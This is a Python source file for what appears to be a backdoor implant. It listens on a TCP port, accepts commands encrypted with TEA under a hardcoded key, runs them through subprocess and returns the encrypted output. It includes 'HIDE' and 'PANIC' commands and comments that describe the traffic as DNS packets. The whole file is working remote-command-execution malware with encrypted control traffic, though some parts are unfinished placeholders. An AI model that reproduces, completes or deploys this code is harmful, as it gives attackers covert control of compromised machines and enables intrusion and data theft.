import socket, subprocess, os, time, base64, ctypes, itertools, math, sys, codecs

def runServer():
    HOST = "localhost" #"192.168.1.8"
    PORT = 1337 #52

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(2)

    while True:
        conn, addr = s.accept() 
        print("New connection made from: " + str(addr))
        connectionLoop(conn, addr)
    
    conn.close()  # close the connection

def connectionLoop(conn, addr):
    PKT_SIZE = 1024
    while True:
        ##receive client data
        recv_data = conn.recv(PKT_SIZE).decode()
        if not recv_data:
            # if data is not received break
            break

        ##unpack data - SHOULD NEVER ERROR
        recv_msg, err = unpackData(recv_data)
        
        #DEBUGGING: print the 
        print("client said (enc):" + str(recv_data))
        print("client said (dec):" + str(recv_msg))

        ##extract the command
        cmd = recv_msg.strip().split(" ",1)

        ##handle special commands
        if (cmd[0] == "HIDE"):
            #Execute a hide
            exit(0)
        elif (cmd[0] == "PANIC"):
            #clean up
            exit(0)

        ##try to execute the command
        cmd_output, err = tryExecute(cmd)
        #handle errors
        if (err == 1):
            #command execution failed
            cmd_output = "ERROR EXECUTING" #**temporary error message
        
        #****check if output is > 512 bytes; trim size if so
        if(len(cmd_output) > 512):
            print("Oops")

        ##craft return packet with cmd_output
        packet, err = packInput(cmd_output)
        if(err != 0):
            print("Some error packing output occured")
            print(err)
            packet = "TEMP_ERROR_PACKET" #replace this with code to re-try packing

        #send return packet data
        conn.send(packet.encode())
    return

######################
#  Helper functions  #
######################

#def tryExecute(cmd)
#args: cmd - command extracted from client packet
#returns: (cmd_output, err) - output of command execution and error message
#   err = 0 ; no error
#       = 1 ; bash execution error
#       = 2 ; UNUSED error
def tryExecute(cmd):
    cmd_output = None
    err = 0

    try:
        rawout = subprocess.run(cmd, capture_output=True)
    except Exception as e:
        # error executing command
        err = 1
    else:
        cmd_output = str(rawout.stdout,'utf-8')
        #cmd_output = "testytesttest"
    finally:
        pass
    return cmd_output, err

#def packInput(user_input)
#args: user_input - user provided command string
#returns: (packet, err) - DNS packet and error message
#   err = 0 ; no error
#       = 1 ; user_input length error
#       = 2 ; encryption error
#       = 3 ; decryption error
#       = 4 ; packet crafting error
def packInput(user_input):
    TEA_KEY = "zMWYCRLd4szoBiPP"
    packet = None
    err = 0

    ##user input sanitation
    safe_input = processInput(user_input)
    if(safe_input == None):
        err = 1
        return packet, err
    print(safe_input)
    ##encryption
    encrypted_safe_input = ""
    try:
        encrypted_safe_input = encrypt(safe_input, TEA_KEY)
    except Exception as e:
        err = 2
        return packet, err
    finally:
        pass
    
    ##decryption test
    try:
        decrypt(encrypted_safe_input, TEA_KEY)
    except Exception as e:
        err = 2
        return packet, err
    finally:
        pass

    ##craft packet
    packet = encrypted_safe_input

    #return packet
    return packet, err

#def unpackData(recv_data)
#args: recv_data - packet recieved from server
#returns: (recv_msg, err) - extracted plaintext message and error message
#   err = 0 ; no error
#       = 1 ; unpacking error
#       = 2 ; decryption error
def unpackData(recv_data):
    TEA_KEY = "zMWYCRLd4szoBiPP"
    recv_msg = None
    err = 0

    ##extract message packet
    encrypted_recv_msg = recv_data

    ##decrypt message
    try:
        recv_msg = decrypt(encrypted_recv_msg, TEA_KEY)
    except Exception as e:
        err = 2
        return recv_msg, err
    finally:
        pass

    ##strip white space sanitation
    recv_msg = recv_msg.strip()    

    ##return message
    return recv_msg, err

#def processInput(user_input)
#args: user_input - raw input captured from cli
#returns: None if user_input is too long (>512 bytes)
#otherwise, user_input padded to a certain length with whitespace. 
def processInput(uinput):
    len_input = len(uinput)
    if(len_input <= 64):
        return (uinput + ' ' * (64 - len(uinput)))
    elif(len_input <= 128):
        return (uinput + ' ' * (128 - len(uinput)))
    elif(len_input <= 256):
        return (uinput + ' ' * (256 - len(uinput)))
    elif(len_input <= 512):
        return (uinput + ' ' * (512 - len(uinput)))
    else:
        #command was too large
        return None
    return None
    

#######################################################################################
# TEA implementation: https://gist.github.com/twheys/4e83567942172f8ba85058fae6bfeef5 #
#######################################################################################
def encrypt(plaintext, key):
    if not plaintext:
        return ''

    v = _str2vec(plaintext.encode())
    k = _str2vec(key.encode()[:16])

    bytearray = b''.join(_vec2str(_encipher(chunk, k))
                         for chunk in _chunks(v, 2))

    return base64.b64encode(bytearray).decode()


def decrypt(ciphertext, key):
    if not ciphertext:
        return ''

    k = _str2vec(key.encode()[:16])
    v = _str2vec(base64.b64decode(ciphertext.encode()))

    return b''.join(_vec2str(_decipher(chunk, k))
                    for chunk in _chunks(v, 2)).decode()


def _encipher(v, k):
    y, z = [ctypes.c_uint32(x)
            for x in v]
    sum = ctypes.c_uint32(0)
    delta = 0x9E3779B9
    for n in range(32, 0, -1):
        sum.value += delta
        y.value += (z.value << 4) + k[0] ^ z.value + sum.value ^ (z.value >> 5) + k[1]
        z.value += (y.value << 4) + k[2] ^ y.value + sum.value ^ (y.value >> 5) + k[3]

    return [y.value, z.value]


def _decipher(v, k):
    y, z = [ctypes.c_uint32(x)
            for x in v]
    sum = ctypes.c_uint32(0xC6EF3720)
    delta = 0x9E3779B9
    for n in range(32, 0, -1):
        z.value -= (y.value << 4) + k[2] ^ y.value + sum.value ^ (y.value >> 5) + k[3]
        y.value -= (z.value << 4) + k[0] ^ z.value + sum.value ^ (z.value >> 5) + k[1]
        sum.value -= delta
    return [y.value, z.value]


def _chunks(iterable, n):
    it = iter(iterable)
    while True:
        chunk = tuple(itertools.islice(it, n))
        if not chunk:
            return
        yield chunk


def _str2vec(value, l=4):
    n = len(value)
    num_chunks = math.ceil(n / l)
    chunks = [value[l * i:l * (i + 1)]
              for i in range(num_chunks)]

    return [sum([character << 8 * j
                 for j, character in enumerate(chunk)])
            for chunk in chunks]


def _vec2str(vector, l=4):
    return bytes((element >> 8 * i) & 0xff
                 for element in vector
                 for i in range(l)).replace(b'\x00', b'')

if __name__ == '__main__':
    runServer()